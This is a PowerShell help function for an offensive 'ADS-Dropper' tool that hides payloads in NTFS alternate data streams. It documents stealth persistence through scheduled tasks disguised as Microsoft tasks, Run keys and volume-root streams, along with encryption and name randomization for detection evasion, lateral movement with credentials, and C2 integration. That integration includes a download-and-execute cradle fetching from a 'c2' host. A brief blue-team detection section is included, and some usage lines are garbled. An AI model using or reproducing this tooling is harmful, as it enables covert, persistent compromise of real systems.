function Show-Help { $helpText = @"
╔══════════════════════════════════════════════════════════════════════════╗ ║ ADS-Dropper v2.1 - Quick Reference ║ ╚══════════════════════════════════════════════════════════════════════════╝
USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
QUICK START EXAMPLES:
Local deployment (basic)
.\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
Full stealth (RECOMMENDED)
.\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize
Multiple persistence methods
.\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
Lateral movement
$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential‘cred
PERSISTENCE METHODS:
task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
volroot Volume Root ADS (admin required, NOVEL) └─ Stores command in C::ads_* └─ No parent file, survives directory wipes
ENCRYPTION:
-Encrypt enables AES-256 with machine-specific key (UUID+hostname)
Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
RANDOMIZATION:
-Randomize generates unique artifacts per deployment:
File: SystemCache.dat → CacheSvc.log Stream: :syc_payload → :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs → app_log_kqmxyz.vbs Task: UsbCeip → a3f5b2c1-... (GUID)
C2 FRAMEWORK EXAMPLES:
Realm C2 (Imix agent)
$imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
Metasploit
$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")' .\ADS-Dropper.ps1 -Payload $msf -Persist @('task')
Sliver
$sliver = @('C:\payloads\sliver.ps1') .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
DETECTION & CLEANUP:
Blue team detection: - Sysmon Event ID 15 (ADS creation) - Event ID 4698 (Task creation) - PowerShell: Get-ChildItem C:\ProgramData -Stream *
Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
TESTING:
Validation suite: .\tests\validate.ps1
Manual verification: dir /r C:\ProgramData # Show ADS schtasks /query /fo LIST # Show tasks Get-Item C::ads_* 2>$null # Check volume root
MORE INFO:
Full help: Get-Help .\ADS-Dropper.ps1 -Full Examples: Get-Help .\ADS-Dropper.ps1 -Examples Parameters: Get-Help .\ADS-Dropper.ps1 -Parameter *
GitHub: https://github.com/yourusername/ADS-Dropper Blog writeup: https://yourusername.github.io/blog/ads-dropper
ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
"@
Write-Host $helpText -ForegroundColor Cyan
}
